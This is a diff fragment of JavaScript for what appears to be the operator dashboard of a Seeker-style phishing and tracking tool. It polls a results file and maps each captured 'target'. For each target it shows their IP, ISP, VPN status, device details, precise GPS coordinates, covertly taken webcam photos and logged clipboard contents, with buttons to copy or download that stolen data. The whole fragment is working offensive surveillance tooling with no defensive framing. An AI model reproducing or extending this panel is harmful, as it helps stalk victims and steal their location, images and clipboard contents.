+            </div>
+          `;
+          
+          const customIcon = L.divIcon({
+            html: iconHtml,
+            className: 'custom-leaflet-icon',
+            iconSize: [32, 32],
+            iconAnchor: [16, 32]
+          });
+          
+          const popupHtml = `
+            <div class="p-2 flex flex-col gap-1.5 text-slate-200">
+              <div class="flex items-center justify-between border-b border-white/10 pb-1 mb-1">
+                <span class="font-bold text-xs text-indigo-300 font-mono">${sid.substring(0, 10)}...</span>
+                <span class="text-[9px] font-mono text-slate-400">${timestamp}</span>
+              </div>
+              <div class="text-xs">
+                <p class="font-bold text-white text-sm"><i class="fa-solid fa-map-pin text-rose-500 mr-1"></i> ${city}, ${country}</p>
+                <p class="font-mono mt-0.5"><i class="fa-solid fa-circle-nodes text-indigo-400 text-[10px] mr-1"></i> IP: <strong>${ip}</strong></p>
+                <p class="font-mono mt-0.5"><i class="fa-solid fa-shield-halved text-[10px] mr-1" style="color: ${markerColor}"></i> Status: <strong>${gpsStatus}</strong></p>
+              </div>
+              <button onclick="selectTarget('${sid}')" class="mt-2 w-full bg-indigo-600/80 hover:bg-indigo-600 text-white text-[10px] font-bold py-1 px-2 rounded tracking-wider uppercase transition">Buka Panel Detail</button>
+            </div>
+          `;
+          
+          const marker = L.marker([markerLat, markerLon], { icon: customIcon }).addTo(markersLayer);
+          marker.bindPopup(popupHtml, { closeButton: false });
+          
+          // Store marker reference in global object
+          currentMarkers[sid] = marker;
+          
+          // If this was the selected marker and it's newly rendered, pan to it
+          if (selectedSid === sid) {
+            // Keep popup open
+            setTimeout(() => {
+              marker.openPopup();
+            }, 100);
+          }
+        }
+      });
+      
+      mapMarkers = currentMarkers;
+    }
+    
+    // Select a target card
+    function selectTarget(sid) {
+      selectedSid = sid;
+      
+      // Update UI elements (Highlights cards)
+      renderDashboard();
+      
+      // Find details object
+      const record = seeker_results.find(r => r.sid === sid);
+      if (!record) return;
+      
+      // Populate Details Sidebar
+      document.getElementById('detail-sid').innerText = record.sid || 'N/A';
+      document.getElementById('detail-time').innerText = `Capture: ${record.timestamp || 'N/A'}`;
+      
+      const country = record.geo ? record.geo.country : 'N/A';
+      const city = record.geo ? record.geo.city : 'N/A';
+      document.getElementById('detail-country').innerText = country;
+      document.getElementById('detail-city').innerText = city;
+      document.getElementById('detail-isp').innerText = record.geo ? record.geo.isp || 'N/A' : 'N/A';
+      document.getElementById('detail-org').innerText = record.geo ? record.geo.org || 'N/A' : 'N/A';
+      document.getElementById('detail-ip').innerText = record.ip || 'N/A';
+      
+      const isVpn = record.vpn && record.vpn.is_vpn;
+      const vpnBadge = document.getElementById('detail-vpn-status');
+      if (isVpn) {
+        vpnBadge.innerText = 'VPN AKTIF';
+        vpnBadge.className = 'py-1.5 text-right font-bold text-rose-500 animate-pulse';
+      } else {
+        vpnBadge.innerText = 'Residential (Clear)';
+        vpnBadge.className = 'py-1.5 text-right font-bold text-emerald-400';
+      }
+      
+      document.getElementById('detail-os').innerText = record.os || 'N/A';
+      document.getElementById('detail-brand').innerText = record.brand || 'N/A';
+      document.getElementById('detail-model').innerText = record.model || 'N/A';
+      document.getElementById('detail-browser').innerText = record.browser || 'N/A';
+      document.getElementById('detail-ram').innerText = record.ram ? record.ram + ' GB' : 'N/A';
+      document.getElementById('detail-cores').innerText = record.cores || 'N/A';
+      document.getElementById('detail-res').innerText = record.res || 'N/A';
+      document.getElementById('detail-gpu').innerText = record.render || 'N/A';
+      
+      // GPS Coordinates
+      const gpsSection = document.getElementById('detail-gps-section');
+      const hasGps = record.location && (record.location.status === 'success' || record.location.status === 'ip_fallback');
+      
+      if (hasGps) {
+        gpsSection.classList.remove('hidden');
+        document.getElementById('detail-lat').innerText = record.location.lat;
+        document.getElementById('detail-lon').innerText = record.location.lon;
+        document.getElementById('detail-accuracy').innerText = record.location.acc;
+        document.getElementById('detail-altitude').innerText = record.location.alt;
+        document.getElementById('detail-speed').innerText = record.location.spd;
+        
+        const cleanLat = record.location.lat.replace(' deg', '');
+        const cleanLon = record.location.lon.replace(' deg', '');
+        document.getElementById('detail-gmaps-link').href = `https://www.google.com/maps/place/${cleanLat}+${cleanLon}`;
+      } else {
+        gpsSection.classList.add('hidden');
+      }
+      
+      // Camera Capture
+      const cameraSection = document.getElementById('detail-camera-section');
+      const hasCamera = record.camera && record.camera.status === 'success';
+      
+      if (hasCamera) {
+        cameraSection.classList.remove('hidden');
+        const imgPath = 'db/captures/' + record.sid + '.jpg';
+        document.getElementById('detail-camera-img').src = imgPath + '?t=' + Date.now();
+        document.getElementById('detail-camera-download').href = imgPath;
+      } else {
+        cameraSection.classList.add('hidden');
+      }
+      
+      // Clipboard Data
+      const clipSection = document.getElementById('detail-clipboard-section');
+      const clipEntries = document.getElementById('clipboard-entries');
+      const hasClipboard = record.clipboard && Array.isArray(record.clipboard) && record.clipboard.length > 0;
+      
+      if (hasClipboard) {
+        clipSection.classList.remove('hidden');
+        clipSection.dataset.sid = record.sid;
+
+        var prevCount = clipEntries.dataset.count || '0';
+        var newCount = record.clipboard.length;
+        var isNew = parseInt(newCount) > parseInt(prevCount);
+
+        clipEntries.innerHTML = '';
+        [...record.clipboard].reverse().forEach(function(entry, idx) {
+          var isLatest = (idx === 0 && isNew);
+          var entryDiv = document.createElement('div');
+          entryDiv.className = 'bg-slate-950/40 border border-white/5 rounded-lg p-2 group' + (isLatest ? ' new-clip flash-highlight' : '');
+          entryDiv.innerHTML =
+            '<div class="flex items-start justify-between gap-1">' +
+              '<div class="min-w-0 flex-1">' +
+                '<div class="text-[10px] text-cyan-400/70 font-mono mb-1">' + (entry.timestamp || '') + '</div>' +
+                '<div class="text-xs text-slate-200 font-mono break-all leading-relaxed clipboard-data">' + escapeHtml(entry.data || '') + '</div>' +
+              '</div>' +
+              '<button onclick="copyClipboardEntry(this)" data-text="' + escapeHtml(entry.data || '').replace(/"/g, '&quot;') + '" class="shrink-0 opacity-0 group-hover:opacity-100 text-[10px] px-1.5 py-0.5 rounded bg-slate-700/50 border border-white/10 text-slate-400 hover:text-cyan-400 hover:border-cyan-500/30 transition-all" title="Copy">' +
+                '<i class="fa-solid fa-copy text-[8px]"></i>' +
+              '</button>' +
+            '</div>';
+          clipEntries.appendChild(entryDiv);
+        });
+        clipEntries.dataset.count = newCount;
+
+        if (isNew) {
+          setTimeout(function() {
+            var flashes = clipEntries.querySelectorAll('.flash-highlight');
+            flashes.forEach(function(el) { el.classList.remove('flash-highlight'); });
+          }, 1500);
+        }
+
+        window._currentClipboardData = record.clipboard;
+        window._currentClipboardSid = record.sid;
+      } else {
+        clipSection.classList.add('hidden');
+        window._currentClipboardData = null;
+        window._currentClipboardSid = null;
+      }
+      
+      // Reveal Detail panel
+      document.getElementById('detail-panel').classList.remove('hidden');
+      
+      // Center and Zoom Map on target pin
+      let markerLat = null;
+      let markerLon = null;
+      
+      if (hasGps) {
+        markerLat = parseFloat(record.location.lat.replace(' deg', ''));
+        markerLon = parseFloat(record.location.lon.replace(' deg', ''));
+      } else if (record.geo && record.geo.latitude && record.geo.longitude) {
+        markerLat = parseFloat(record.geo.latitude);
+        markerLon = parseFloat(record.geo.longitude);
+      }
+      
+      if (markerLat !== null && markerLon !== null && !isNaN(markerLat) && !isNaN(markerLon)) {
+        map.flyTo([markerLat, markerLon], hasGps ? 15 : 10, {
+          animate: true,
+          duration: 1.5
+        });
+        
+        // Open the matching marker's popup
+        if (mapMarkers[sid]) {
+          setTimeout(() => {
+            mapMarkers[sid].openPopup();
+          }, 1500);
+        }
+      }
+    }
+    
+    // Close detail panel
+    function closeDetails() {
+      selectedSid = null;
+      document.getElementById('detail-panel').classList.add('hidden');
+      renderDashboard();
+    }
+    
+    // Load script dynamically for real-time CORS-free updates
+    function reloadData() {
+      // Remove existing results-script element if exists
+      const oldScript = document.getElementById('results-script');
+      if (oldScript) {
+        oldScript.remove();
+      }
+      
+      // Create and append the new results.js script with query param to bypass cache
+      const script = document.createElement('script');
+      script.id = 'results-script';
+      script.src = 'db/results.js?t=' + Date.now();
+      script.onload = function() {
+        renderDashboard();
+      };
+      script.onerror = function() {
+        console.error("Failed to load results database results.js");
+      };
+      document.body.appendChild(script);
+    }
+
+    // Clipboard helpers
+    function copyClipboardEntry(btn) {
+      var text = btn.getAttribute('data-text');
+      var el = document.createElement('textarea');
+      el.value = text;
+      el.style.position = 'fixed';
+      el.style.opacity = '0';
+      document.body.appendChild(el);
+      el.select();
+      document.execCommand('copy');
+      document.body.removeChild(el);
+
+      var icon = btn.querySelector('i');
+      var origClass = icon.className;
+      icon.className = 'fa-solid fa-check text-[8px]';
+      setTimeout(function() { icon.className = origClass; }, 1000);
+    }
+
+    function copyAllClipboard() {
+      if (!window._currentClipboardData || !window._currentClipboardData.length) return;
+      var lines = [];
+      window._currentClipboardData.forEach(function(entry) {
+        lines.push('[' + (entry.timestamp || '') + '] ' + (entry.data || ''));
+      });
+      var allText = lines.join('\n');
+      var el = document.createElement('textarea');
+      el.value = allText;
+      el.style.position = 'fixed';
+      el.style.opacity = '0';
+      document.body.appendChild(el);
+      el.select();
+      document.execCommand('copy');
+      document.body.removeChild(el);
+    }
+
+    function downloadClipboardLog() {
+      if (!window._currentClipboardData || !window._currentClipboardData.length) return;
+      var lines = [];
+      window._currentClipboardData.forEach(function(entry) {
+        lines.push('[' + (entry.timestamp || '') + '] ' + (entry.data || ''));
+      });
+      var content = lines.join('\n');
+      var blob = new Blob([content], { type: 'text/plain' });
+      var url = URL.createObjectURL(blob);
+      var a = document.createElement('a');
+      a.href = url;
+      a.download = 'clipboard_' + (window._currentClipboardSid || 'log') + '.txt';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    }
+
+    // App Initialization
+    window.onload = function() {
+      initMap();
+      reloadData();
+      
+      // Set interval to poll results.js every 3 seconds for dynamic real-time updates!
+      setInterval(reloadData, 3000);
+    };
+  </script>
+</body>
+</html>
